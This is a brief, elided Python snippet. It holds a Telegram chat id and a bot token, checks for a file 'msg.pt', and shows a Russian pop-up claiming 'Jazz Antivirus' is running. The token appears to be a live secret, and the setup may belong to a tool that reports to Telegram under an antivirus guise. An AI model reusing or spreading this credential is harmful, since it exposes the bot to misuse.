...
my_id = 5505519836
bot_token = '8196556897:AAHpJCN0DRmwh8yzURMyXiTYRAKV_zClVVA'
...
if os.path.exists("msg.pt"):
	...
	MessageBox(None, f'а вашем ПК запущена программа “Джаз Антивирус” \nДанное сообщение является разовым', '!ВНИМАНИЕ!', 0)
